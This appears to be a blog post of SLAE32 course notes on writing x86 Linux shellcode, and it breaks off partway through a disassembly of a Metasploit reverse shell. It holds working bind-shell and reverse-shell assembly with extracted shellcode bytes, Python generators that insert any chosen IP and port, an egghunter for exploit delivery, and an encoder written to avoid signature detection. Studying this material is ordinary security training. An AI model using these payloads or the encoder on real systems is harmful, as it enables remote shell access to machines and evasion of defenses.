---
title: "SLAE32"
date: 2020-07-01T01:12:00Z
draft: true
tags: ["notes", "SLAE32", "asm"]
---

Below are my old blog posts for the SLAE32 'certification'. 

### Task 1: ASM TCP Bind Shell

Requirements:

- Binds to a port
- Executes a shell on incoming connection
- Port should be 'easily' configurable


I wrote a C bind shell based off of other posts in order to better understand the requirements. In actuality, I wrote multiple as I found better ways of writing the same code, as one does. My final C file is below:
```C
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdio.h>

int main(void)
{
        // Create a struct for the server's listening information
        struct sockaddr_in srv_addr;

        // As seen in https://www.man7.org/linux/man-pages/man7/ip.7.html 
        // Set the socket 'family' to AF_INET
        // Set the sin_port value to the port number, in network byte order
        // Set the s_addr valut to INADDR_ANY, for IP agnostic bind()
        srv_addr.sin_family = AF_INET;  
        srv_addr.sin_port = htons(4444);
        srv_addr.sin_addr.s_addr = INADDR_ANY;

        // Then, create the socket!	
        int socketfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );

        // Now, we need to bind things together
        bind( socketfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

        // Next, we set the socket to 'listen', and apply a 'backlog' argument to 0
        listen( socketfd, 0 );

        // Once set to listen, we need to tell the listening socket to accept connections
        int newSocket = accept(socketfd, NULL, NULL);

        // Set up dup2 for stdin/out/err
        dup2(newSocket, 0);
        dup2(newSocket, 1);
        dup2(newSocket, 2);

        // Lastly, we execute /bin/sh
        execve( "/bin/sh", NULL, NULL );
}
```
Now, we can break down the steps necessary for creating a bind shell via ASM. The process can be broken into objectives:

1. Create a socket
2. Bind said socket
3. Set the bound socket to listen
4. Set the socket to accept new connections
5. Properly redirect input, output and errors
6. Execute a shell

Seeing the tasks broken down within the C helped to make the above list, but more than that, allowed me to better understand the data being passed to each function and why. With some objectives to accomplish, I came up with the following code for a bind shell:
```
global _start

section .text

_start:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        
        ; Push it to the stack for the socket(x,x, protocol) argument, set to IPPRORO_IP (0)
        push ecx

        ; socket(x, type, x) argument, set to SOCK_STREAM (1)
        push 0x1

        ; socket(domain, x, x) argument, set to AF_INET (2)
        push 0x2

        ; set socketcall(x, args) argument to ESP (the start of our args)
        ; Populate eax with socketcall (0x66)
        ; set socketcall(call, x) to 1 (sys_socket)
        mov ecx, esp
        mov al, 0x66
        mov bl, 0x1
        int 0x80

        ; Our socket file descriptor should be returned within EAX
        mov esi, eax

bind:
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

        ; set up bind socketcall
        mov al, 0x66
        mov bl, 2

        xor ecx, ecx

        ; set up the sockaddr struct (2, 4444, 0)
        push ecx
        push word 0x5C11
        push word 0x2

        ; save the location of the struct
        mov edi, esp

        ; push addrlen (size of sockaddr)
        push 16

        ; push sockaddr pointer
        push edi

        ; push sockfd pointer (loaded from eax earlier)
        push esi

        ; move stack pointer into ecx for args
        mov ecx, esp
        int 0x80


listen:

        ; int listen(int sockfd, int backlog)

        ; set up listen socketcall
        mov al, 0x66
        mov bl, 4

        ; push backlog
        push 0x5

        ; push sockfd
        push esi

        ; load args
        mov ecx, esp

        int 0x80


accept:

        ; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

        ; set up accept socketcall
        inc bl
        mov al, 0x66

        ; zero out edx to push nulls
        xor edx, edx

        ; push sockaddr len (0)
        push edx

        ; push sockaddr pointer (0)
        push edx

        ; push sockfd pointer (saved from socket())
        push esi

        ; load args into ecx
        mov ecx, esp

        int 0x80

        ; eax contains returned clientfd from accept()
        ; let's save that out
        xchg ebx, eax
        xor ecx, ecx
        mov cl, 0x2

dup:

        ; int dup2(int oldfd, int newfd)

        ; load dup2 into eax 
        ; ecx has our counter for stdin/out/err
        
        mov al, 63
        int 0x80
        dec ecx
        jns dup

shell:

        ; int execve(const char *pathname, char *const argv[], char *const envp[])

        ; Zero Out eax for first null (envp) and push to stack
        xor eax, eax
        push eax

        ; Now, push the string bin bash onto the stack for argv
        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        ; Now, need filename pointer
        ; EZ, pop into EBX
        mov ebx, esp

        ; push another null
        push eax
        mov edx, esp

        push ebx

        mov ecx, esp

        ; Now, set up syscall
        mov al, 0xb
        int 0x80
```

It's not small, clocking in at 111 bytes, but there are no nulls, either. So that's cool. There are some easy optimizations that could be made and probably 5 bytes or so could be saved within the execve call alone.
```
$ objdump -d ./bind_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe7\x6a\x10\x57\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x05\x56\x89\xe1\xcd\x80\xfe\xc3\xb0\x66\x31\xd2\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

The next task was to make the port the shell uses easily modifiable. This seemed more straightforward, and I wrote a python script to accept port numbers and spit out the fixed shellcode:
``` python
#!/usr/bin/env python
import sys

if len(sys.argv) < 2:
    print("[-] Provide a port > 256")
    sys.exit()
else:
    if int(sys.argv[1]) <= 256:
        print("[-] Port needs to be greater than 256 to guarantee sockaddr struct size is accurate and avoid null bytes.\n")
        print("If you require a lower port, consider changing the instructions in bind from:")
        print("\tpush ecx\n\tpush word 0x5C11\n\tpush word 0x2\n")
        print("to:")
        print("\tpush ecx\n\tsub esp, 2  ; stack alignment\n\tmov byte [esp], cl  ; null\n\tmov byte [esp], 0x65  ; port 100\n\tpush word 0x2\n")
        sys.exit()

    lport = int(sys.argv[1])

def fixPort(lport):
    p = hex(lport)[2:]
    psize = len(str(p))
    if psize == 1 or psize == 3:
        p = "0" + p

    psize = len(str(p))

    if psize == 2:
        fport = '\\x' + str(p)[0:2]
    else:
        fport = '\\x' + str(p)[0:2] + '\\x' + str(p)[2:4]

    if "\\x00" in fport:
        print("[!] Port conversion contains a null byte, I'm lazy, so choose another port maybe?")
        sys.exit()
    else:
        return fport

port = fixPort(lport)

print("[+] Fixed port: " + port)
shellcode = ""
shellcode += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x51\\x6a\\x01\\x6a"
shellcode += "\\x02\\x89\\xe1\\xb0\\x66\\xb3\\x01\\xcd\\x80\\x89"
shellcode += "\\xc6\\xb0\\x66\\xb3\\x02\\x31\\xc9\\x51\\x66\\x68"
shellcode += port
shellcode += "\\x66\\x6a\\x02\\x89\\xe7\\x6a\\x10\\x57"
shellcode += "\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a"
shellcode += "\\x05\\x56\\x89\\xe1\\xcd\\x80\\xfe\\xc3\\xb0\\x66"
shellcode += "\\x31\\xd2\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93"
shellcode += "\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79"
shellcode += "\\xf9\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68"
shellcode += "\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89"
shellcode += "\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd"
shellcode += "\\x80"


print("")
print("[+] Shellcode:\n" + shellcode)
```

This script just accepts a port as an argument, then writes it in the \x format to the shellcode. If the provided port is less than or equal to 256, I suggest replacement instructions in order to keep the sockaddr struct valid, as a single byte port will throw off our size, and a port such as 512 would result in 0x2000, which has a null byte. I saw a few fixes people made that were clever-- a template nasm file for instance, but rather than do all that, we can keep it simple. If people really need to be binding to privileged ports, they can with a very small amount of additional work.
``` bash
$ ./portGen.py 4444
[+] Fixed port: \x11\x5c

[+] Shellcode:
\x31\xc0\x31\xdb\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xb0\x66\xb3\x01\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe7\x6a\x10\x57\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x05\x56\x89\xe1\xcd\x80\xfe\xc3\xb0\x66\x31\xd2\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

After dropping it into shellcode.c and compiling, here's the output:
``` bash
$ ./shellcode &
[1] 73667
$ Shellcode Length:  111

$ nc -v localhost 4444
localhost [127.0.0.1] 4444 (?) open
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
^C
[1]+  Done                    ./shellcode
```


### Task 2: ASM TCP Rev Shell

```C                       
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h> 
                       
#define rhost "127.0.0.1"                          
#define rport "4444"   
                       
int main(int argc, char *argv[])                   
{                      
	               
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	               
	struct sockaddr_in sa;                     
	sa.sin_family = AF_INET;                   
	sa.sin_port = htons(rport);                
	               
	inet_pton(AF_INET, rhost, &sa.sin_addr.s_addr);
	               
	connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr_in));
	               
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve("/bin/sh", 0, 0);
}
```

Requirements:

1. Create a socket
2. Call connect
3. Create file descriptors
4. Call execve

Surprisingly, a reverse shell is a bit simpler, and tends to be smaller than our bind couterpart. Without much optimization, this shellcode clocks in at 87 bytes, pretty good for a noob. It also doesn't contain any null bytes.


```
global _start

section .text

_start:
        ; int socketcall(int call, unsigned long *args)
        ; socketcall is syscall 102, or 0x66
        ; socket = 0x1
        xor eax, eax
        xor ebx, ebx
        mov al, 0x66

        ; int socket(int domain, int type, int protocol)
        push ebx
        push 0x1
        push 0x2

        ; set up args for socketcall
        mov ecx, esp
        inc bl
        int 0x80

        ; save the file descriptor returned by socket()
        mov edi, eax

connect:
        ; int socketcall(int call, unsigned long *args)
        ; Again, 0x66 for socketcall
        mov al, 0x66

        ; increase ebx to get 2 for AF_INET
        inc ebx

        ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        ; First, we need to create the sockaddr struct
        push 0x0101017f
        push word 0x5C11
        push word bx

        ; save the address of sockaddr
        mov esi, esp

        ; Now, let's push the addrlen (16)
        push 0x10

        ; Gotta push the sockaddr pointer now
        push esi

        ; Lastly, we need the socket file descriptor returned from
        push edi

        ; now, set up the right args for socketcall
        mov ecx, esp
        inc ebx
        int 0x80

        ; save the socketfd, zero and add two to ecx for dup2 loop
        xchg ebx, edi
        xor ecx, ecx
        mov cl, 0x2
dup:
        ; int dup2(int oldfd, int newfd)
        mov al, 63
        int 0x80
        dec ecx
        jns dup

shell:
        ; int execve(const char *pathname, char *const argv[], char *const envp[])
        ; Zero Out eax for first null (envp) and push to stack
        xor eax, eax
        push eax

        ; Now, push the string bin bash onto the stack for argv
        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        ; Now, need filename
        ; EZ, pop into EBX
        mov ebx, esp

        push eax
        mov edx, esp
        push ebx
        mov ecx, esp

        ; Now, set up syscall
        mov al, 0xb
        int 0x80
```

Objdump output:

```
$ objdump -d ./reverse_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\xb0\x66\x53\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xcd\x80\x89\xc7\xb0\x66\x43\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x53\x89\xe6\x6a\x10\x56\x57\x89\xe1\x43\xcd\x80\x87\xdf\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

Plugging that into shellcode.c works as expected. The next step is creating a wrapper script, similar to the python portGen from Task 1, in order to configure the port and IP at will. I took the portGen.py code and modified it very slightly to add an additional method which converts a provided IP address into hexadecimal format. This is then plugged in to the same location the IP bytes normally go. Since IP addresses are defined with octets, each ranging from 0-255, we don't need to worry about size discrepancies at all.
``` python
#!/usr/bin/env python

import sys
import socket
import binascii

if len(sys.argv) < 3:
    print("[-] Provide a port (> 256) and IP address")
    sys.exit()
else:
    if int(sys.argv[1]) <= 256:
        print("[-] Port needs to be greater than 256 to guarantee sockaddr struct size is accurate and avoid null bytes.\n")
        print("If you require a lower port, consider changing the instructions in connect from:")
        print("\tpush 0x0101017f\n\tpush word 0x5C11\n\tpush word bx\n")
        print("to:")
        print("\txor ecx, ecx\n\tpush 0x0101017f\n\tsub esp, 2  ; stack alignment\n\tmov byte [esp], cl  ; null\n\tmov byte [esp], 0x65  ; port 100\n\tpush word 0x2\n")
        sys.exit()

    lport = int(sys.argv[1])
    ip = sys.argv[2]

def ip2Hex(ip):
        ipHex = ""
        for b in ip.split('.'):
                ipHex += "\\x%02x" % (int(b))
        return ipHex

def setPort(lport):
    p = hex(lport)[2:]
    psize = len(str(p))
    if psize == 1 or psize == 3:
        p = "0" + p

    psize = len(str(p))

    if psize == 2:
        fport = '\\x' + str(p)[0:2]
    else:
        fport = '\\x' + str(p)[0:2] + '\\x' + str(p)[2:4]

    if "\\x00" in fport:
        print("[!] Port conversion contains a null byte, I'm lazy, so choose another port maybe?")
        sys.exit()
    else:
        return fport

port = setPort(lport)
ipHex = ip2Hex(ip)

print("[+] Hex port: " + port)
print("[+] Hex ip: " + ipHex)

shellcode = ""
shellcode += "\\x31\\xc0\\x31\\xdb\\xb0\\x66\\x53\\x6a\\x01\\x6a"
shellcode += "\\x02\\x89\\xe1\\xfe\\xc3\\xcd\\x80\\x89\\xc7\\xb0"
shellcode += "\\x66\\x43\\x68"
shellcode += ipHex # IP
shellcode += "\\x66\\x68"
shellcode += port # PORT
shellcode += "\\x66\\x53\\x89\\xe6\\x6a\\x10\\x56\\x57\\x89"
shellcode += "\\xe1\\x43\\xcd\\x80\\x87\\xdf\\x31\\xc9\\xb1\\x02"
shellcode += "\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50"
shellcode += "\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f"
shellcode += "\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2"
shellcode += "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

print("[+] Shellcode: \n" + shellcode)
```

Pretty slick!

```
$ ./revshell_Config.py 4444 127.1.1.1
[+] Hex port: \x11\x5c
[+] Hex ip: \x7f\x01\x01\x01
[+] Shellcode: 
\x31\xc0\x31\xdb\xb0\x66\x53\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xcd\x80\x89\xc7\xb0\x66\x43\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x53\x89\xe6\x6a\x10\x56\x57\x89\xe1\x43\xcd\x80\x87\xdf\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

### Task 3: Egghunters!

There's a lot of information out there on the web about egghunters, and some really good papers too (SKAPE). If you're totally unfamiliar and just want the tldr, here's the gist of it:

Let's say you are testing some sort of server application, maybe it's an FTP app. The application has a couple different commands that accept some input, but when you send certain data to one of the commands, the application crashes in a way that allows you to control the flow of execution. "Hooray!" you might be thinking, "Now I can send my payload!"

To your dismay, after sending payload after payload you find you can only fit a measly 40 bytes in memory through this vulnerable command, womp womp. Earlier while fuzzing, you noticed you could send arbitrarily large amounts of bytes in the other commands though, then send your payload and take control of execution. There's a high probability the other thousand \x41's you sent right before invoking the crash are hanging out in memory, though... but where? Will that even matter?

This is where an egghunter comes in. An egghunter acts as a small piece of code which searches through arbitrary memory locations for a specific, unique string we define, known as an egg. Once it locates the egg, a good egghunter will check the bytes following the intial egg for another egg. If it doesn't find the egg twice, it continues to search memory, looking for the two eggs in a row. Assuming we prepend our shellcode with our egg, if the egghunter locates two eggs, which again, are expected to be unique values, then it returns the location it found.

Now, since our shellcode is prepended with the two unique eggs, the egghunter has found our shellcode in memory, and we're free to jump to it and begin execution.

```
global _start

section .text

_start:
        ; zero edx for kicks
        xor edx, edx

fix_page:

        ; This is a hacky fix for page sizes
        ; 0xfff is 4095, so we inc edx later on to avoid nulls
        ; page fix is only called if we need some gud gud memory
        or dx, 0xfff

egghunter:

        inc edx

        ; int access(const char *pathname, int mode)
        ; Give ebx an arbitrary address within the page
        lea ebx, [edx + 4]

        ; push, pop, syscall for access() 
        push dword 0x21
        pop eax
        int 0x80

        ; compare access() return for errors
        ; fix the page and get to gud gud memory
        ; but only if we got bad memory (f2 = EFAULT) :[
        cmp al, 0xf2
        je fix_page

        ; if not, load our egg into eax
        mov eax, 0x41414141

        ; load the memory to scan into edi
        mov edi, edx

        ; Scan it, jump to egghunter if no match
        scasd
        jnz egghunter

        ; Do that again, just to be sure
        scasd
        jnz egghunter

        ; If we got here, it's valid!
        jmp edi
```

### Task 4: Encoders

For this task, I decided to start with a simple ROT cipher as we're simply trying to avoid signature based detections. In python, that might look like this:

```python
>>> input = 1
>>> rotate = 13
>>> out = input + rotate
>>> print(out)
14
```

That's pretty... expected, haha. Translated to asm, that's still very simple and there's a number of ways to accomplish it depending on your needs. Here's a rather verbose, easily understood version using write():

```
global _start

section .text

_start:

    xor eax, eax
    mul ebx
    push ebx
    mov bl, 0x1
    mov al, 0x04 ; write()

add:

    mov ecx, value
    add byte [ecx], 0x0C
    mov edx, 0x01
    int 0x80

storage:        
    value: db 0x29
```

Again, pretty simple. In this case, we get a value of '5' returned by the application, which is 0x35, or 0x29 + 0x0C. We know our processor works, great! 

Although encoded, a ROT cipher is pretty boring. As I was searching around and seeing how other encoders had been implemented, I found a ROT cipher with a twist. Since we're working with bytes, in order to prevent an overflow, such as ROT13(0xFA) which would equal 0x107, we can perform a check to see if the value is going to be greater than 256. If so, we can instead subtract from the value. This isn't strictly necessary since we're working with lower register values, but it does add a layer of obscurity to the encoder. 

For example:

ROT13(0xFA) = 0x107
0x107 - 0x0D = 0xFA

In assembly, we can effectively just ignore the overflow by dealing only with lower register values (e.g. al, bl), but I thought this would be a good exercise. In order to add my own spice to the equation, I also added a bitwise NOT to the encoder and decoder, so the encoder will add or subtract the provided value, then bitwise NOT the result. The decoder will then perform a bitwise NOT and add or subtract the value, depending on whether or not the 'overflow' condition would be met.

Here's the python script I came up with:

``` python
#!/usr/bin/python
import sys

# ROT X + NOT encoder / decoder

if len(sys.argv) < 2:
    print("[!] Provide a shift")
    sys.exit()
else:
    shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Set up a few variables for use in our loop
orig = ""
encoded = bytearray()
encodedOut1 = ""
encodedOut2 = ""
encodedOut3 = ""
encoded2 = ""

# We can't let the bytes become bigger than 256 minus the value we add!
addVal = int(sys.argv[1])
maxVal = 256 - addVal

# Create a loop to encode our shellcode
for byte in bytearray(shellcode):   

    # For sanity, we'll print out the original shellcode
    orig += '\\x%02x' % (byte & 0xff)

    # Check how big the byte is, if it's going to be larger than the 
    # maxVal, we need to account for it (otherwise it's bigger than a byte)
    if (byte < maxVal):
        tmp = (~(byte + addVal))&0xff
        encodedOut1 += '\\x%02x' % (tmp)
        encodedOut2 += '%02x' % (tmp)
        encodedOut3 += '0x%02x,' % (tmp)
        encoded.append(tmp)
    else:
        tmp = (~(addVal - maxVal + byte))&0xff
        encodedOut1 += '\\x%02x' % (tmp)
        encodedOut2 += '%02x' % (tmp)
        encodedOut3 += '0x%02x,' % (tmp)
        encoded.append(tmp)

# Simple decoder
# Does the inverse of above
for byte in bytearray(encoded):

    if (byte < maxVal):
        tmp = (~byte  - addVal)&0xff
        encoded2 += '\\x%02x' % (tmp)
    else:
        tmp = (addVal + maxVal - ~byte)&0xff
        encoded2 += '\\x%02x' % (tmp)

l1 = len(bytearray(shellcode))

print("Original shellcode (%s bytes): \n%s\n") % (str(l1), orig)
print("Shift %s + NOT Encodings:\n") % (int(addVal))

print("%s\n") % (encodedOut1)
print("0x%s\n") %(encodedOut2)
print("%s\n") % (encodedOut3)
print("Unshift (should be orig): \n%s\n") % (encoded2)
```

Here's some sample output:

```
$ ./encoder.py 12
Original shellcode (30 bytes): 
\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Shift 12 + NOT Encodings:

\xc2\x33\xa3\x8b\x91\x92\x80\x8b\x8b\x91\x8a\x85\xc4\x8b\xc4\xc4\xc4\xc4\x6a\x10\xa3\x6a\x11\xa0\x6a\x12\x43\xe8\x26\x73

0xc233a38b9192808b8b918a85c48bc4c4c4c46a10a36a11a06a1243e82673

0xc2,0x33,0xa3,0x8b,0x91,0x92,0x80,0x8b,0x8b,0x91,0x8a,0x85,0xc4,0x8b,0xc4,0xc4,0xc4,0xc4,0x6a,0x10,0xa3,0x6a,0x11,0xa0,0x6a,0x12,0x43,0xe8,0x26,0x73,

Unshift (should be orig): 
\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

Now, here's the shellcode I came up with.

```
global _start

section .text

_start:
        ; Ye ol' jmpy cally popy
        jmp short call_shellcode

decode:

        ; pop the location of encodedShellcode into EDI
        pop edi
        xor ecx, ecx
        mov cl, len

decoder:
        ; get the byte in edi into eax
        mov al, byte [edi]

        ; check the size of the byte
        cmp al, 0x0A

        ; If it's less than our shift, jump to rollover
        jl short rollover

        ; not the byte
        ; sub 10 from it, then replace it
        not byte al
        sub al, 0x0C
        ;not byte al
        mov [edi], al

        jmp short next

rollover:
        ; We're here because the number is going to rollover if we add to it

        ; zero ebx, then add FF to it
        ; add one, to get 100 without nulls
        xor ebx, ebx
        mov bl, 0xff
        inc bx

        ; just subtract from bl
        sub bl, 0x0C

        ; not the byte
        ; add the shift and replace it
        not byte al
        mov esi, eax
        add ebx, esi
        mov [edi], bl

next:
        inc edi
        loop decoder
        jmp short encodedShellcode

call_shellcode:

        call decode
        encodedShellcode: db 0xc2,0x33,0xa3,0x8b,0x91,0x92,0x80,0x8b,0x8b,0x91,0x8a,0x85,0xc4,0x8b,0xc4,0xc4,0xc4,0xc4,0x6a,0x10,0xa3,0x6a,0x11,0xa0,0x6a,0x12,0x43,0xe8,0x26,0x73
        len: equ $-encodedShellcode
```

Sure, it's not the sexiest, but I thought it was pretty clever. Also, there are no nulls, wahoo!

```
$ objdump -d ./execve-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x29\x5f\x31\xc9\xb1\x1e\x8a\x07\x3c\x0a\x7c\x08\xf6\xd0\x2c\x0c\x88\x07\xeb\x11\x31\xdb\xb3\xff\x66\x43\x80\xeb\x0c\xf6\xd0\x89\xc6\x01\xf3\x88\x1f\x47\xe2\xde\xeb\x05\xe8\xd2\xff\xff\xff\xc2\x33\xa3\x8b\x91\x92\x80\x8b\x8b\x91\x8a\x85\xc4\x8b\xc4\xc4\xc4\xc4\x6a\x10\xa3\x6a\x11\xa0\x6a\x12\x43\xe8\x26\x73"
```

### Task 5: Disassemble MSF 

This task requests students to disassemble and analyze at least three shellcode samples created by metasploit, specifically those under the linux/x86 families. At the time of course creation, the tools msfpayload, msfencode etc had not yet been combined into msfvenom, which is what I'll obviously use. I decided to perform analysis on the following three payloads:

shell_reverse_tcp (a non-staged reverse shell)
shell_bind_tcp (a non-staged bind shell)
adduser	(a payload for adding a user, duh)

Although not the most unique shellcodes, most other non-meterpreter payloads are, realistically, pretty simple. I chose the two metasploit equivalents of task 1 and 2, to see how a well optimized shellcode can perform similar tasks in fewer bytes.

Let's start with the first: 

#### shell_reverse_tcp

I went with ndisasm for the analysis of these shellcodes. It works well and takes stdin

```
$ msfvenom -p linux/x86/shell_reverse_tcp RHOST=192.168.1.1 RPORT=4444 -f raw | ndisasm -u -
/var/lib/gems/2.5.0/gems/bundler-1.17.3/lib/bundler/rubygems_integration.rb:200: warning: constant Gem::ConfigMap is deprecated
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  68C0A80110        push dword 0x1001a8c0
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```

68 bytes... That's impressive. My greenhorn linux reverse shell came in around 87 bytes, I think. That's not bad, but at the time I didn't see many ways to further optimize it. Comparing them now, optimizations are pretty clear.

Breaking down these shellcodes is easy if we separate them by syscalls. Below is the first snippet, until we encounter an int 0x80. The first call is to socketcall, or 0x66.
```
00000000  31DB              xor ebx,ebx 	; Zero out ebx
00000002  F7E3              mul ebx 		; zero out eax, mul returns the value in eax
00000004  53                push ebx 		; push 0 onto the stack for socket() 'protocol' argument [NULL]
00000005  43                inc ebx 		; increase ebx to 1
00000006  53                push ebx 		; push 1 onto the stack for socket() 'type' argument [SOCK_STREAM]
00000007  6A02              push byte +0x2 	; push 2 onto the stack for socket() 'domain' agument [AF_INET]
00000009  89E1              mov ecx,esp 	; move the pointer to the arguments for socketcall into ecx
0000000B  B066              mov al,0x66 	; move the syscall 0x66 (102) for socketcall into eax
0000000D  CD80              int 0x80 		; make the syscall (ebx contains the value 1, or 'socket()', set at 0x00000005)
```
The above asm is straightforward, but there are a lot of tricks and optimized register usages. The next bit of code is very clever-- I thought my loop for dup2 was well made, and now I see this efficient beast:
```
0000000F  93                xchg eax,ebx 	; socket() returns the file descriptor for the new socket in eax-- xcgh is a single byte less than a mov and is equivalent for this use
00000010  59                pop ecx 		; the last thing pushed to the stack was 0x02 at 0x00000007, pop that into ecx for a counter and our first dup2 arg
00000011  B03F              mov al,0x3f 	; mov the syscall 0x3F (63) into eax
00000013  CD80              int 0x80 		; call dup2, returning into eax on success
00000015  49                dec ecx 		; decrement ecx 
00000016  79F9              jns 0x11 		; jump back to 0x00000011 if the SF flag is set
```
The above code acts as a very succint dup2 loop, taking only nine bytes total, and the loop itself eight. Until I read this I didn't think that you could just rearrange the format of the required calls, but that makes quite a lot of sense now. In retrospect, I wouldn't have been able to come up with a reason as to why you couldn't.

This next bit is responsible for calling `connect()` 
```
00000018  68C0A80110        push dword 0x1001a8c0	; For the sockaddr struct, this is our IP in hex! 
0000001D  680200115C        push dword 0x5c110002 	; Also for the sockaddr struct, this is the port!
00000022  89E1              mov ecx,esp 			; move the pointer for sockaddr into ecx
00000024  B066              mov al,0x66 			; move the syscall for socketcall() into eax
00000026  50                push eax 				; push the sockaddr length onto the stack 
00000027  51                push ecx 				; push the pointer to sockaddr struct onto the stack
00000028  53                push ebx 				; push the socket file descriptor onto the stack
00000029  B303              mov bl,0x3 				; move the connect syscall into ebx
0000002B  89E1              mov ecx,esp 			; move the arguments for connect into ecx
0000002D  CD80              int 0x80 				; call connect!
```
This last bit is for actually executing the shell, via our good friend execve 
```
0000002F  52                push edx 				; push NULL onto the stack as first arg
00000030  686E2F7368        push dword 0x68732f6e	; 
